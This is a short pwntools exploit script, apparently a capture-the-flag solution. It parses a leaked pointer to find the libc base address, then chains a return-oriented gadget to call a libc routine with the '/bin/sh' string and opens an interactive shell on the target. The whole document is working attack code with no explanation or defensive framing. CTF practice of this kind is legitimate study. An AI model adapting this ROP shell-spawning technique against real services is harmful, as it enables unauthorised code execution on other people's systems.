io = start()

io.readuntil(b'~~8~~ ')

libc.address = int(io.readuntil(b' ').decode()) - 0x40790

# 0x0000000000030e29: mov rdi, qword ptr [rsp + 0x28]; mov rax, qword ptr [rsp + 0x10]; call rax;
gadget = libc.address + 0x30e29

pl = flat(
    0,
    libc.address + 0x4c022,
    0,
    0,
    next(libc.search(b'/bin/sh\0')),
    gadget
)

io.writeline(pl)



io.interactive()